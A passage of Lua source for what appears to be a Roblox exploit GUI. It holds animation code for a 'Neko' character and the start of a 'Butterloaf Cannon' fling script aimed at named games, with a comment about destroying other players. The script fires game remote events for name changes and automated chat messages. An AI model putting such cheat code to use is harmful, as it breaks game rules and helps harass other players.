					tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(8)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(90),math.rad(-90+40)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(-90),math.rad(0)),LerpStyle(0.2,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
				end 
				ComboCont = 1
			end
			Attacking = false
		end
	end
	local Mouse = game.Players.LocalPlayer:GetMouse()
	local B1Hold = false
	Mouse.Button1Down:Connect(function()
		B1Hold = true 
		while B1Hold == true do
			wait()
			Attack()
		end
	end)
	local Running = false
	Mouse.Button1Up:Connect(function()
		B1Hold = false
	end)
	Mouse.KeyDown:Connect(function(key)
		if key == "z" then
			SpinKick()
		else
			if key == "t" and Attacking == false then
				Attacking = true
				makesound("rbxassetid://6433451653",1,1,tors):Play()
				for i=0,100 do
					swait()
					neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad( -15 + math.rad(math.sin(time()*16)*15)),0,0),LerpStyle(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
					RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(-10 +  math.sin(time()*16)*10),math.rad(0),math.rad(0)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0.4 + math.sin(time()*17)*0.4,0) * CFA(0,math.rad(90),math.rad(123)),LerpStyle(0.07*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(10),0,math.rad(-90)),LerpStyle(0.07*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(-30 + math.sin(time()*17)*20),math.rad(-10 +  math.sin(time()*16)*10)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(10 +  math.sin(time()*16)*-10)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
					TailWeld.C0 = TailWeld.C0:Lerp(TC0 * CFrame.Angles(math.rad(-20 + math.sin(-time()*3.83)*-20),math.rad(-math.sin(time()*3.83/2)*24),0),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				end
				Attacking = false
			else
				if key == "r" and Attacking == false then
					Attacking = true
					while game.Players.LocalPlayer.Character.Humanoid.MoveDirection.Magnitude < 0.1 do
						swait()
						game.Players.LocalPlayer.Character.HumanoidRootPart.Position = tors.Position
						neck.C1 = neck.C1:Lerp(nek * CF(0,-0.4,0) * CFA(math.rad(-90),math.rad(-math.cos(time()*3)*30),0),LerpStyle(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
						RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,-2.5) * CFA(math.rad(78),math.rad(math.sin(time()*3)*12),math.rad(math.rad(math.sin(time()*3)*40))),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.3,0.4 +0.4+math.sin(time()*3)*0.2,-0.4 -0.2+math.sin(time()*3)*0.2) * CFA(math.rad(-45)+math.rad(math.sin(time()*3)*12),math.rad(0),math.rad(180 - 10+math.cos(time()*3)*5)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-0.3,0.4+0.4-math.sin(time()*3)*0.2,-0.4 -0.2+math.sin(time()*3)*0.2) * CFA(math.rad(-45)-math.rad(math.sin(time()*3)*12),math.rad(0),math.rad(-180 + 10 +math.cos(time()*3)*5)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(-math.sin(time()*3)*12),math.rad(math.sin(time()*3)*30),math.rad(-12 - 50 + math.cos(time()*3)*30)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(-math.sin(time()*3)*12),math.rad(math.sin(time()*3)*30),math.rad(12 + 50 + math.cos(time()*3)*30)),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
						TailWeld.C0 = TailWeld.C0:Lerp(TC0 * CFrame.Angles(math.rad(0),0,math.rad(math.cos(time()*3)*40)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))

					end
					Attacking = false
				else if key == "f" then
						if Running == false then
							Running = true 
							Humanoid.WalkSpeed = 40
						else
							Running = false
							Humanoid.WalkSpeed = 20
						end
					elseif key == "x" and Attacking == false and Mouse.Target.Parent:FindFirstChildWhichIsA("Humanoid") ~= nil then
						Attacking = true
						Camera = workspace.CurrentCamera
						Camera.CameraType = "Scriptable"
						local Target = Mouse.Target.Parent
						for i = 0,200,1 do
							swait()
							Camera.CFrame = Camera.CFrame:Lerp(CFrame.new((head.CFrame * CFrame.new(0,0,-5)).Position,head.CFrame.Position),1)
							neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(20),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(20),math.rad(0),math.rad(0)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,-0.5,0) * CFA(math.rad(-25),math.rad(0),math.rad(00)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,-0.5,0) * CFA(math.rad(-25),math.rad(0),math.rad(00)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(20+ -40)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-20+ -4)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						end

						for i = 0,20,1 do
							swait()
							Camera.CFrame = Camera.CFrame:Lerp(CFrame.new((head.CFrame * CFrame.new(0,0,-3)).Position,head.CFrame.Position),1)
							neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(20),math.rad(0),math.rad(0)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,-0.5,0) * CFA(math.rad(-40),math.rad(0),math.rad(00)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,-0.5,0) * CFA(math.rad(-40),math.rad(0),math.rad(00)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(20+ -40)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-20+ -4)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						end
						RootPart.CFrame = Target.HumanoidRootPart.CFrame * CFrame.new(0,0,-8)
						for i = 0,100,1 do
							swait()
							game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Target.HumanoidRootPart.Position
							Camera.CFrame = Camera.CFrame:Lerp(CFrame.new((head.CFrame * CFrame.new(-3,0,0)).Position,Target.HumanoidRootPart.CFrame.Position),0.2)
							neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(20),math.rad(0),math.rad(0)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,-0.5,0) * CFA(math.rad(-80),math.rad(0),math.rad(-20)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,-0.5,0) * CFA(math.rad(-80),math.rad(0),math.rad(20)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(20+ -40)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
							tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-20+ -4)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						end
						Attacking = false
						Camera.CameraType = "Custom"
					end
				end
			end
		end
	end)
	local RLA = CFrame.new(0,0,0)

	local Anim = "Idle"



	Humanoid.WalkSpeed = 20
	Msgreq("FE Neko Anims V1.6","FE Neko Animations Loaded, have fun - Made by Creo",5,nil)
	while true do
		swait()
		hitfloor = rayCast(RootPart.Position, CFrame.new(RootPart.Position, RootPart.Position - Vector3.new(0, 0.5, 0)).lookVector, 4, CloneChar)
		local torvel = (game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Vector3.new(1, 0, 1)).magnitude
		local velderp = RootPart.Velocity.y
		if RootPart.Velocity.y > 0 and hitfloor == nil then
			Anim = "Jumping"

		elseif RootPart.Velocity.y < 0 and hitfloor == nil then
			Anim = "Falling"
		elseif torvel < .5 and hitfloor ~= nil  then
			Anim = "Idle"
		elseif torvel > .5 and  hitfloor ~= nil  then
			Anim = "Walking"
		end
		local W1 = game.Players.LocalPlayer.Character.Humanoid.MoveDirection* RootPart.CFrame.LookVector
		local W2 = game.Players.LocalPlayer.Character.Humanoid.MoveDirection* RootPart.CFrame.RightVector
		WVA = W1.X+W1.Z
		RLV = W2.X+W2.Z


		if Attacking == false then
			game.Players.LocalPlayer.Character.HumanoidRootPart.Position = tors.Position
			if Anim == "Falling" then
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0.3) * CFA(math.rad(20),0,0),LerpStyle(0.4,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root *CF(0,0,0) * CFA(0,0,0),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(-40),0,math.rad(5)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(-40),0,math.rad(-5)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.4,0.8,0) * CFA(0,0,math.rad(10)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0.4,0.5,0)  * CFA(0,0,math.rad(50)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			elseif Anim == "Jumping" then
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0.3) * CFA(math.rad(-20),0,0),LerpStyle(0.4,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root *CF(0,0,0) * CFA(0,0,0),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(0,math.rad(-40),math.rad(-20)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(0,math.rad(40),math.rad(20)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.4,0.8,0) * CFA(0,0,math.rad(-10)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0.4,0.5,0)  * CFA(0,0,math.rad(-50)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			elseif Anim == "Idle" then
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(6+math.sin(time()*3.83)*-5),math.rad(-20) + math.rad( math.sin((time()*3.83)/2)*30),math.rad(-math.cos((time()*3.83)/2)*13)),LerpStyle(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,math.cos((time()*3.83))/10) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(-0.1,math.cos((time()*3.83))/10,0) * CFA(math.rad(-5)+ -math.sin((-time()*3.83))/8.7,math.rad(0),math.rad(-5)-math.sin((-time()*3.83))/8.7),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0.1,math.cos((time()*3.83))/10,0) * CFA(math.rad(-5)+ -math.sin((-time()*3.83))/8.7,math.rad(0),math.rad(5)+math.sin((-time()*3.83))/8.7),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,-math.cos((time()*3.83))/8,0) * CFA(math.rad(-4),math.rad(-12),math.rad(8)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,-math.cos((time()*3.83))/8,0) * CFA(math.rad(-1),math.rad(7),math.rad(2)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				TailWeld.C0 = TailWeld.C0:Lerp(TC0 * CFrame.Angles(math.rad(-20 + math.sin(-time()*3.83)*-20),math.rad(-math.sin(time()*3.83/2)*24),0),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			elseif Anim == "Walking" and Running == false then
				RLA =  CFrame.new((math.sin((time()*8))/1)*0.5 *WVA,0.3*(1-WVA),(math.sin((time()*8))/1)*0.5 *RLV) * CFrame.Angles((-math.sin((time()*8))/1.5)*RLV,0,(math.sin((time()*8))/1.2)*WVA)
				LLA =  CFrame.new((math.sin((time()*8))/1)*0.5 *WVA,0.3*(1-WVA),(math.sin((time()*8))/1)*0.5 *RLV) * CFrame.Angles((-math.sin((time()*8))/1.5)*RLV,0,(math.sin((time()*8))/1.2)*WVA)
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(7),math.clamp(math.cos((time()*8))*0.2 + math.rad(-RootPart.RotVelocity.Y*8),math.rad(-85),math.rad(85)),math.rad(-RootPart.RotVelocity.Y*0.4)),LerpStyle(0.4,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root *CF(0,-math.sin((time()*8*2))/3.2,-math.sin((time()*8*2))/3) * CFA(math.clamp( WVA*0.7,-0.8,0.1) + -math.rad(math.sin(time() *(8*2))*3),math.clamp( math.rad(0) - -RootPart.RotVelocity.Y/50,math.rad(-20),math.rad(20)),math.cos((time()*8))*0.2),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(-math.sin((time()*8))/4.5,0,0) * CFA(math.rad(-5),-math.sin((time()*8))*0.1 + math.rad(RootPart.RotVelocity.Y*3),-math.sin((time()*8))*0.4),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-math.sin((time()*8))/4.5,0,0) * CFA(math.rad(-5),-math.sin((time()*8))*0.1 + math.rad(RootPart.RotVelocity.Y*3),-math.sin((time()*8))*0.4),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,(math.cos((time()*8))/8),0) * RLA * CFA(0, (-math.sin((time()*8))*0.5)*WVA,math.clamp( WVA*0.7,-0.8,0.1)),LerpStyle(0.2,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,(-math.cos((time()*8))/8),0) * LLA * CFA(0, (-math.sin((time()*8))*0.5)*WVA,-math.clamp( WVA*0.7,-0.8,0.1)),LerpStyle(0.2,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				TailWeld.C0 = TailWeld.C0:Lerp(TC0 * CFrame.Angles(math.rad(-30 + math.sin(-time()*8)*-20),0,-math.rad(-math.sin(time()*8/2)*20 + RLV*2)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			elseif Anim == "Walking" and Running == true then
				RLA =  CFrame.new(0,(0.5 + math.cos(time()*15)*0.5)*WVA+ 0.2,(0.5 - math.cos(time()*15)*0.5)*RLV+ 0.2) * CFrame.Angles(0,-math.rad(math.sin(time()*15)*80)*RLV,math.rad(math.sin(time()*15)*80)*WVA)
				LLA =  CFrame.new(0,(0.5 + math.cos(time()*15)*0.5)*WVA- 0.2,(-0.5 + math.cos(time()*15)*0.5)*RLV- 0.2) * CFrame.Angles(0,-math.rad(math.sin(time()*15)*80)*RLV,math.rad(-math.sin(time()*15)*80)*WVA)
				RAA = CFrame.new(0,0.8 + math.sin(time()*15)*0.9*WVA,math.sin(time()*15)*0.9*RLV) * CFrame.Angles(0,math.rad(-math.cos(time()*15)*85)*RLV,math.rad(math.cos(time()*15)*85)*WVA)
				LAA = CFrame.new(0,0.8 + math.sin(time()*15)*0.9*WVA,math.sin(time()*15)*0.9*-RLV) * CFrame.Angles(0,math.rad(-math.cos(time()*15)*85)*RLV,math.rad(-math.cos(time()*15)*85)*WVA)
				neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(0,math.rad(-RootPart.RotVelocity.Y*5),0),LerpStyle(0.4,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root *CF((-1 - math.sin(time()*15)*2)*RLV,(-1 - math.sin(time()*15)*2)*WVA,-1 + 0.5 -math.sin(time()*15)*0.8) * CFA(math.rad(80 - math.cos(time()*15)*20),0,0),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.6+ math.sin(time()*15)*1,0,-0.6)* RAA * CFA(math.rad(-10 - -math.cos(time()*15*2)*10),0,math.rad(80)),LerpStyle(0.6,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-0.6+ -math.sin(time()*15)*1,0,-0.6) * LAA * CFA(math.rad(-10 - -math.cos(time()*15*2)*10),0,math.rad(-80)),LerpStyle(0.6,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
				tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.4 + -math.cos(time()*15)*0.9,0,0) * RLA * CFA(0, 0,math.rad(50)),LerpStyle(0.6,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(-0.4+ math.cos(time()*15)*0.9,0,0) * LLA * CFA(0, 0,math.rad(-80)),LerpStyle(0.6,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
				TailWeld.C0 = TailWeld.C0:Lerp(TC0 * CFrame.new(0,0.7,0.3) * CFrame.Angles(math.rad(-110 + math.sin(-time()*15)*-20),-math.rad(RLV*30),0),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))

			end
		end
	end
end)
UICorner_32.Parent = Neko

Butterloaf.Name = "Butterloaf"
Butterloaf.Parent = FlingScriptsFrame
Butterloaf.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Butterloaf.Position = UDim2.new(0.641732335, 0, 0.314039648, 0)
Butterloaf.Size = UDim2.new(0, 143, 0, 43)
Butterloaf.Font = Enum.Font.Nunito
Butterloaf.Text = "Butterloaf Cannon"
Butterloaf.TextColor3 = Color3.fromRGB(238, 238, 238)
Butterloaf.TextSize = 21.000
Butterloaf.MouseButton1Click:Connect(function()
	-- the butterloaf experience
	-- this script was intended to work in "Life in paradise" and "Adopt and raise" games, DESTROY THE GODAMN ODERS, END THEM END THEEEEE-


	function RandomString(Length)
		local Length = typeof(Length) == "number" and math.clamp(Length,1,100) or math.random(80,100)
		local Text = ""
		for i = 1,Length do
			Text = Text..string.char(math.random(14,128))
		end
		return Text
	end
	function NameChange(TEXT)
		local args = {
			[1] = "RP",
			[2] = TEXT
		}

		game:GetService("ReplicatedStorage").Events.MainEvent:FireServer(unpack(args))

	end
	--NameChange(RandomString(5))
	--wait(4)
	local WingParts = {}
	local VEL = 0
	local NOHATS = {}
	local SETHATS = {}
	local Attacking = false
	local Mode = 1



	local AllowChatF = true
	local chat = function(MSG)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(MSG, "All")
	end

	local Auto = function(plr)
		plr.Chatted:Connect(function(msg)
			if HumanDied then
			else
				print("wh??")
				if (string.find(string.lower(msg),"what") and (string.find(string.lower(msg),"script") ~= nil or string.find(string.lower(msg),"scrip") ~= nil) or (string.find(string.lower(msg),"script") or string.find(string.lower(msg),"scrip") ~= nil) and string.find(string.lower(msg),"name")) and AllowChatF == true then
					wait()
					chat('"'..plr.Name..' do not ask for this script, its not publicly available" - Creo AutoMessage')
					AllowChatF = false
					wait(10)
					AllowChatF = true
				end
			end
		end)
	end
	game.Players.PlayerAdded:Connect(function(plr)
		if HumanDied then

		else
			Auto(plr)
		end
	end)
	function AutoMessage()
		local Players = game.Players:GetChildren()
		for i = 1,#Players do
			Auto(Players[i])
		end
	end


	local HumanRoot = game.Players.LocalPlayer.Character.HumanoidRootPart
	local lIT = false
	rayCast = function(Pos, Dir, Max, Ignore)

		return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), (CloneChar and game.Players.LocalPlayer.Character))
	end
	local Player = game.Players.LocalPlayer
	local StartPosition = Player.Character.HumanoidRootPart.CFrame

	local WEARITEMTHING = game:GetService("ReplicatedStorage"):FindFirstChild("WearItem")
	local NotificationBindable = Instance.new("BindableFunction")
	local TweenService = game:GetService("TweenService")
	local MakeTween = function(timetack,easingstyle,easingdirection,repeats,flipflop)
		local newtween = TweenInfo.new(
			timetack, 
			easingstyle, 
			easingdirection, 
			repeats, 
			flipflop, 
			0 
		)
		return newtween
	end
	local Msgreq = function(Title,Text,Duration,Button1Text,Button2Text)
		game.StarterGui:SetCore("SendNotification", {
			Title = Title;
			Text = Text;
			Icon = "";
			Duration = Duration;
			Button1 = Button1Text;
			Button2 = Button2Text;
			Callback = NotificationBindable;
		})
	end


	local HatLoad = nil
	NotificationBindable.OnInvoke = function(result)
		if result == "yes" then
			HatLoad = true

		else
			HatLoad = false
		end
	end

	Msgreq("","Load with hats? (specific games only)",9999999,"yes","no")
	repeat wait() until HatLoad ~= nil	

	local AudioReplication = nil
	NotificationBindable.OnInvoke = function(result)
		if result == "Yes" then
			AudioReplication = true
			ReplicationBoombox = game.Players.LocalPlayer.Backpack:WaitForChild("Boombox",1)
			ReplicationBoombox.Parent = Player.Character	
		else
			AudioReplication = false
		end
	end


	Player.Character.HumanoidRootPart.CFrame = CFrame.new(0,0,0)
	wait(1)
	Player.Character.HumanoidRootPart.Anchored = true



	if game.Players.LocalPlayer.Backpack:WaitForChild("Boombox",1) then
		Msgreq("","Load with audio replication? (specific games only)",9999999,"Yes","No")
		repeat wait() until AudioReplication ~= nil	
	end


	function sandbox(var,func)
		local env = getfenv(func)
		local newenv = setmetatable({},{
			__index = function(self,k)
				if k=="script" then
					return var
				else
					return env[k]
				end
			end,
		})
		setfenv(func,newenv)
		return func
	end
	cors = {}
	mas = Instance.new("Model",game:GetService("Lighting"))
	ScreenGui0 = Instance.new("ScreenGui")
	LoadingGui = ScreenGui0
	Frame1 = Instance.new("Frame")
	TextLabel2 = Instance.new("TextLabel")
	ScreenGui0.Name = "LoadUI"
	ScreenGui0.Parent = mas
	ScreenGui0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui0.DisplayOrder = 999999999
	ScreenGui0.IgnoreGuiInset = true
	Frame1.Name = "F"
	Frame1.Parent = ScreenGui0
	Frame1.Size = UDim2.new(1, 0, 1, 0)
	Frame1.BackgroundColor = BrickColor.new("Smoky grey")
	Frame1.BackgroundColor3 = Color3.new(0.333333, 0.333333, 0.498039)
	TextLabel2.Parent = Frame1
	TextLabel2.Position = UDim2.new(0, 0, 0.25, 0)
	TextLabel2.Size = UDim2.new(1, 0, 0.5, 0)
	TextLabel2.BackgroundColor = BrickColor.new("Institutional white")
	TextLabel2.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel2.BackgroundTransparency = 1
	TextLabel2.Font = Enum.Font.ArialBold
	TextLabel2.FontSize = Enum.FontSize.Size14
	TextLabel2.Text = "Placeholder"
	TextLabel2.TextColor = BrickColor.new("Really black")
	TextLabel2.TextColor3 = Color3.new(0, 0, 0)
	TextLabel2.TextScaled = true
	TextLabel2.TextSize = 14
	TextLabel2.TextWrap = true
	TextLabel2.TextWrapped = true
	LoadingText = TextLabel2
	for i,v in pairs(mas:GetChildren()) do
		v.Parent = script
		pcall(function() v:MakeJoints() end)
	end
	mas:Destroy()
	for i,v in pairs(cors) do
		spawn(function()
			pcall(v)
		end)
	end
	LoadingGui.Parent = game.Players.LocalPlayer.PlayerGui





	--Converted with ttyyuu12345's model to script plugin v4
	function sandbox(var,func)
		local env = getfenv(func)
		local newenv = setmetatable({},{
			__index = function(self,k)
				if k=="script" then
					return var
				else
					return env[k]
				end
			end,
		})
		setfenv(func,newenv)
		return func
	end
	cors = {}
	mas = Instance.new("Model",game:GetService("Lighting"))
	Model0 = Instance.new("Model")
	Part1 = Instance.new("Part")
	Part2 = Instance.new("Part")
	Weld3 = Instance.new("Weld")
	Part4 = Instance.new("Part")
	Weld5 = Instance.new("Weld")
	Part6 = Instance.new("Part")
	Weld7 = Instance.new("Weld")
	Part8 = Instance.new("Part")
	Weld9 = Instance.new("Weld")
	Part10 = Instance.new("Part")
	Weld11 = Instance.new("Weld")
	Part12 = Instance.new("Part")
	Weld13 = Instance.new("Weld")
	Part14 = Instance.new("Part")
	Weld15 = Instance.new("Weld")
	Part16 = Instance.new("Part")
	Weld17 = Instance.new("Weld")
	Part18 = Instance.new("Part")
	Weld19 = Instance.new("Weld")
	Part20 = Instance.new("Part")
	Weld21 = Instance.new("Weld")
	Part22 = Instance.new("Part")
	Weld23 = Instance.new("Weld")
	Part24 = Instance.new("Part")
	Weld25 = Instance.new("Weld")
	Part26 = Instance.new("Part")
	Weld27 = Instance.new("Weld")
	Part28 = Instance.new("Part")
